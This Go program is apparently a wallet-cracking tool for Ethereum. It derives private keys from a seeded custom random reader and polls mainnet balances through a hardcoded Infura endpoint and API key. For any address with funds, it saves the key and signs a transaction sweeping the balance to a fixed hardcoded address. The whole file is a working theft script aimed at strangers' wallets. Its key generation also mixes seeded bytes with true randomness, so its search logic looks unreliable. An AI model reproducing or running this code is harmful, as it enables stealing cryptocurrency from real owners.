package main

import (
	"context"
	"crypto/ecdsa"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/ethclient"
	"github.com/kprc/libeth/account"
	"github.com/kprc/libeth/wallet"
	"github.com/kprc/nbsnetwork/tools"
	"math/big"
	"os"
	"path"
	"strconv"
	"time"
)

var seed int64

func main() {

	if len(os.Args) != 3 {
		panic("please enter parameter")
	}

	passwd := os.Args[1]
	seedstr := os.Args[2]

	home, _ := tools.Home()

	savedir := path.Join(home, ".crack_eth")

	if !tools.FileExists(savedir) {
		os.MkdirAll(savedir, 0755)
	}

	//passwd, err := gopass.GetPasswdPrompt("Please Enter Password: ", true, os.Stdin, os.Stdout)
	//if err != nil {
	//	panic("input password error")
	//}
	//var seedstr []byte
	//seedstr, err=gopass.GetPasswdPrompt("Please Enter Seed: ", true,os.Stdin,os.Stdout)
	//if err!=nil{
	//	panic("input seed error")
	//}
	var err error

	seed, err = strconv.ParseInt(string(seedstr), 10, 64)
	if err != nil {
		panic("seed error")
	}

	var ec *ethclient.Client
	ec, err = ethclient.Dial("https://mainnet.infura.io/v3/df97d0caa3514b3d99e94bc7764cffa0")
	if err != nil {
		panic("dial eth error")
	}

	toAddr := common.HexToAddress("0x3D002404deee63697fBEf95657DcE57335BF561D")

	for {

		time.Sleep(time.Second * 3)
		var priv *ecdsa.PrivateKey
		priv, err = ecdsa.GenerateKey(crypto.S256(), &MyRand{})

		acct := &account.EthAccount{}
		acct.PrivKey = priv
		acct.PubKey = (priv.Public()).(*ecdsa.PublicKey)
		acct.EAddr = crypto.PubkeyToAddress(*acct.PubKey)
		acct.SAddr = acct.EAddr.String()

		var balance *big.Int
		if balance, err = ec.BalanceAt(context.Background(), acct.EAddr, nil); err != nil {
			continue
		}

		left := wallet.BalanceHuman(balance) - 0.00042

		fmt.Println("addr:", acct.SAddr, " balance:", left)

		if left > 0 {

			var data []byte
			data, _ = acct.Marshal(string(passwd))
			tools.Save2File(data, path.Join(savedir, acct.SAddr))

			var (
				nonce    uint64
				gasPrice *big.Int
				chainId  *big.Int
				signdTx  *types.Transaction
			)
			nonce, err = ec.PendingNonceAt(context.Background(), acct.EAddr)
			if err != nil {
				continue
			}
			gasPrice, err = ec.SuggestGasPrice(context.Background())
			if err != nil {
				continue
			}
			chainId, err = ec.NetworkID(context.Background())
			if err != nil {
				continue
			}
			tx := types.NewTransaction(nonce, toAddr, wallet.BalanceEth(left), uint64(21000), gasPrice, nil)
			signdTx, err = types.SignTx(tx, types.NewEIP155Signer(chainId), acct.PrivKey)
			if err != nil {
				continue
			}
			err = ec.SendTransaction(context.Background(), signdTx)
			if err != nil {
				continue
			}

		}
	}
}

type MyRand struct {
}

func (mr *MyRand) Read(p []byte) (n int, err error) {
	buf := make([]byte, 8)
	binary.BigEndian.PutUint64(buf, uint64(seed))
	seed += 1

	copy(p, buf)
	if len(p) > 8 {
		n, err := rand.Read(p[8:])
		return n + 8, err
	}

	return len(p), nil
}
